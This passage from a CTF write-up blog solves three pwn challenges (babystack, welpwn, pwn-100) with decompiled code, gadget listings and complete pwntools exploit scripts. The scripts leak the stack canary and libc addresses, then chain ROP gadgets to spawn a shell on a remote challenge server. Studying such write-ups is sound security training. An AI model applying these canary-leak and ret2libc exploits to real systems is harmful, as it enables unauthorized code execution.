<p><code>sub_4008B9</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_4008B9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">put</span>(<span class="string">&quot;--------&quot;</span>);</span><br><span class="line">  <span class="built_in">put</span>(<span class="string">&quot;1.store&quot;</span>);</span><br><span class="line">  <span class="built_in">put</span>(<span class="string">&quot;2.print&quot;</span>);</span><br><span class="line">  <span class="built_in">put</span>(<span class="string">&quot;3.quit&quot;</span>);</span><br><span class="line">  <span class="built_in">put</span>(<span class="string">&quot;--------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_4007F7</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_400841</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400841</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0x20</span>uLL) &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">atoi</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>Without <code>system</code> and <code>/bin/sh</code>, it is <code>ret2libc</code>. Though it gives <code>libc</code> file, <code>Canary</code> dont let us do stack overflow directly.</p>
<p>The general solution: first leak <code>Canary</code> and then write it back when performing stack overflow, then using stack overflow to <code>ret2libc</code>.</p>
<p>Since <code>Canary</code> has <code>\x00</code> as the end, we can print it as string by adding printable letters as padding in the front of <code>Canary</code>.</p>
<p>As for <code>ret2libc</code> we have <code>puts</code>, <code>write</code> and <code>read</code>, and we are so familiar to it. Actually this time I will use <code>one_gadget</code> to find <code>execve</code> call in <code>libc-2.23.so</code>.</p>
<p>In <code>main()</code> it has </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0x100</span>uLL);</span><br></pre></td></tr></table></figure>
<p>which causes overflow, and the padding should be <code>0x90 - 0x8 = 0x88</code> according to <code>char s; // [rsp+10h] [rbp-90h]</code> and <code>unsigned __int64 v6; // [rsp+98h] [rbp-8h]</code>.</p>
<p>Then use gadgets like <code>pop rdi ; ret</code> for outputting <code>Canary</code> content by <code>puts</code> and <code>write</code> (<code>write</code> needs more gadgets as it has 4 parameters).</p>
<p>Use <code>one_gadget</code> to find <code>execve(&quot;/bin/sh&quot;,...)</code> (Using LibcSearcher to get <code>system(&#39;/bin/sh&#39;)</code> is also ok but slower):</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ one_gadget libc-2.23.so</span><br><span class="line">0x45216 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf0274 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1117 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Using <code>one-gadget</code> in <code>glibc</code>:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&quot;./babystack&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="string">&#x27;32063&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./babystack&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"> </span><br><span class="line">execve = <span class="number">0x45216</span></span><br><span class="line">main_addr = <span class="number">0x400908</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0400a93</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"> </span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"> </span><br><span class="line">execve_addr = puts_addr - (libc.symbols[<span class="string">&#x27;puts&#x27;</span>] - execve)</span><br><span class="line"> </span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(execve_addr)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="welpwn"><a href="#welpwn" class="headerlink" title="welpwn"></a>welpwn</h2><p>Attachment: <a href="/filehost/apcaw/welpwn">welpwn</a><br>Description: None</p>
<p>This one does not give <code>libc</code> file.</p>
<h3 id="Information-1"><a href="#Information-1" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file welpwn</span><br><span class="line">welpwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=a48a707a640bf53d6533992e6d8cd9f6da87f258, not stripped</span><br><span class="line">$ checksec welpwn</span><br><span class="line">[*] &#x27;/root/welpwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-400h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;Welcome to RCTF\n&quot;</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">fflush</span>(_bss_start);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="built_in">echo</span>((__int64)&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>echo</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">echo</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s2[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">    s2[i] = *(_BYTE *)(i + a1);</span><br><span class="line">  s2[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;ROIS&quot;</span>, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;RCTF&#123;Welcome&#125;&quot;</span>, s2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot; is not flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p>In <code>main()</code> it reads <code>buf</code> (<code>0x400</code> bytes), then in <code>echo()</code> it copys <code>buf</code> to <code>s2</code> which is only <code>0x10</code> bytes long. That is where the overflow happens. When it saw a <code>\x00</code> the string copy will stop.</p>
<p>There are no <code>system</code> and <code>/bin/sh</code> or something else related to getting shell, so we choose to leak <code>libc</code> first.</p>
<p>It contains <code>puts</code>, <code>write</code>, <code>read</code> and some other functions, so we can use <code>puts</code> or <code>write</code> to output <code>read</code> address, then find out the <code>libc</code> version, calculate <code>libc</code> base address, and finally execute <code>system(&quot;/bin/sh&quot;)</code>.</p>
<p>First determine the offset of overflow. Input <code>aaaaaaaa</code> and step to the end of <code>echo()</code>, check the stack in <code>gdb</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  x/20x 0x00007fffffffde40</span><br><span class="line">0x7fffffffde40: 0xf7fbe4a0      0x00007fff      0xffffde70      0x00007fff</span><br><span class="line">0x7fffffffde50: 0x61616161      0x61616161      0xf7fc390a      0x00007fff</span><br><span class="line">0x7fffffffde60: 0xffffe270      0x00007fff      0x0040082d      0x00000000</span><br><span class="line">0x7fffffffde70: 0x61616161      0x61616161      0xf7fc390a      0x00007fff</span><br><span class="line">0x7fffffffde80: 0xf7ffd9e8      0x00007fff      0xf7ffe4f0      0x00007fff</span><br></pre></td></tr></table></figure>
<p>The <code>aaaaaaaa</code> starts from <code>0x7fffffffde50</code> is <code>s2</code> (copied from <code>buf</code>) in <code>echo()</code>, and the <code>aaaaaaaa</code> starts from <code>0x7fffffffde70</code> is the original <code>buf</code> from <code>main()</code>. The distance is <code>0x20</code>.<br>The memory layout is like this:<br><img src="/imghost/apcaw/r2l1.png" alt="before"><br>As this is a 64-bit program, every unit&#x2F;item is 8-bit length, so to overflow <code>ret addr</code> of <code>echo()</code>, padding is <code>0x18</code>. But it stops to copy when meeting <code>\x00</code>, so padding cannot be address (normally like <code>0x00abcdef</code>).<br>Payload: ‘a’ * 0x18 + pop_4 + ROPchain<br><img src="/imghost/apcaw/r2l2.png" alt="after"><br>The so called pop_4 is to pop 4 items on the stack, which is a clever method, so that program returns to ROPchain successfully. Use <code>ROPgadget</code> to find:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary ./welpwn --only &quot;pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040089e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008a0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008a2 : pop r15 ; ret</span><br><span class="line">0x000000000040089b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040089f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400675 : pop rbp ; ret</span><br><span class="line">0x00000000004008a3 : pop rdi ; ret</span><br><span class="line">0x00000000004008a1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040089d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400589 : ret</span><br><span class="line">0x00000000004006a5 : ret 0xc148</span><br><span class="line">0x000000000040081a : ret 0xfffd</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 13</span><br></pre></td></tr></table></figure>
<p>The pop_4 is in <code>0040089c</code>.<br>As for ROPchain, since 64-bit and 32-bit is different because the first few parameters are saved in registers (<code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>, <code>r8</code>, <code>r9</code>, then on the stack) in 64-bit, while stored on the stack in 32-bit.</p>
<p>The first ROPchain should output some function address, to calculate <code>libc</code> base address and determine <code>libc</code> version. Use <code>puts</code> to output <code>read</code> address and return to <code>main</code>.<br>The first ROPchain: p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main_addr)</p>
<p>Call <code>system(&quot;/bin/sh&quot;)</code> in the next ROPchain.<br>The second ROPchain: p64(pop_rdi) + p64(bin_sh) + p64(system)</p>
<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>LibcSearcher version (the question is it not works for local):</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;welpwn&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">46741</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;welpwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_4 = <span class="number">0x40089c</span></span><br><span class="line">pop_rdi = <span class="number">0x4008a3</span></span><br><span class="line">main_addr = <span class="number">0x4007cd</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(pop_4) + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print sh.recvuntil(&#x27;a&#x27;*0x18)</span></span><br><span class="line"><span class="comment"># print sh.recv(3)</span></span><br><span class="line"><span class="built_in">print</span> sh.recvuntil(<span class="string">&#x27;\x40&#x27;</span>)</span><br><span class="line">read_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> read_addr</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(pop_4) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>DynELF version (get from the internet) which is also effective but seems more complicated:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./welpwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">46741</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./welpwn&quot;</span>)</span><br><span class="line">start_addr=<span class="number">0x400630</span></span><br><span class="line">write_addr=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_addr=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">ppp1_addr=<span class="number">0x40089A</span></span><br><span class="line">ppp2_addr=<span class="number">0x400880</span></span><br><span class="line">clean_addr=<span class="number">0x40089C</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">        p.recv()</span><br><span class="line">        payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>+p64(clean_addr)+p64(ppp1_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_addr)+p64(<span class="number">8</span>)+p64(addr)+p64(<span class="number">1</span>)</span><br><span class="line">        payload+=p64(ppp2_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">56</span>+p64(start_addr)</span><br><span class="line">        p.send(payload.ljust(<span class="number">1024</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">        buff=p.recv(<span class="number">8</span>)</span><br><span class="line">        <span class="built_in">print</span>(buff.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> buff</span><br><span class="line">dyn=DynELF(leak,elf=ELF(<span class="string">&quot;./welpwn&quot;</span>))</span><br><span class="line">sys_addr=dyn.lookup(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;libc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;System addr:%X&quot;</span> % sys_addr)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getshell</span>():</span></span><br><span class="line">    pop_rdi=<span class="number">0x4008A3</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>+p64(clean_addr)+p64(ppp1_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_addr)+p64(<span class="number">8</span>)+p64(elf.bss())+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(ppp2_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">56</span>+p64(pop_rdi)+p64(elf.bss())+p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(payload.ljust(<span class="number">1024</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">    p.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">getshell()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn-100"><a href="#pwn-100" class="headerlink" title="pwn-100"></a>pwn-100</h2><p>Attachment: <a href="/filehost/apcaw/pwn100">pwn100</a><br>Description: None</p>
<p>Similar to <code>welpwn</code>. Just another <code>ret2libc</code> without given <code>.so</code> file.</p>
<h3 id="Information-2"><a href="#Information-2" class="headerlink" title="Information"></a>Information</h3><p>Checksec:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file pwn100</span><br><span class="line">pwn100: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=b4d2f91a3feed3a7fb36890c3c462c535abd757c, stripped</span><br><span class="line">$ checksec pwn100</span><br><span class="line">[*] &#x27;/root/pwn100&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">sub_40068E</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_40068E</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40068E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sub_40063D</span>((__int64)&amp;v1, <span class="number">200</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;bye~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_40063D</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_40063D</span><span class="params">(__int64 a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)((<span class="keyword">signed</span> <span class="keyword">int</span>)i + a1), <span class="number">1uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h3><p>The main logic is to read 200 bytes one by one, and store them in a <code>0x40</code> length array, which leads to an overflow.</p>
<p>There is no <code>system</code> or <code>/bin/sh</code> again, but it has <code>puts</code> and <code>read</code> functions, which helps to perform <code>ret2libc</code>.</p>
<p><code>pwn-100</code> is pretty similar to <code>welpwn</code>, but the input part of the exploit script is really different. Here it reads 200 bytes&#x2F;chars and your <code>\n</code> counts, so be careful to use <code>sendline</code> in <code>pwntools</code> (use <code>send</code> instead, I wasted hours watching my script encountering <code>EOF</code>). </p>
<h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><p>LibcSearcher method always seemed simple:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn100&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">47390</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn100&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0400763</span></span><br><span class="line">main_addr = <span class="number">0x40068e</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> sh.recvuntil(<span class="string">&#x27;bye~\n&#x27;</span>)</span><br><span class="line">source = sh.recv()</span><br><span class="line">read_addr = u64(source[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(read_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;start libcsearcher&#x27;</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;base:&#x27;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system:&#x27;</span>+<span class="built_in">hex</span>(system_addr)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;/bin/sh:&#x27;</span>+<span class="built_in">hex</span>(bin_sh)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>In <code>welpwn</code> exploit it has <code>read_addr = u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</code>, and here <code>read_addr = u64(source[:-1].ljust(8,&#39;\x00&#39;))</code> also gives it 6 bytes. Truth is: last 7 bytes is we should focus, but the last one is <code>0xa</code> aka <code>LF</code> (line feed), so the rest consist of the output address.</p>
<p>DynELF method may be complicated but faster:</p>
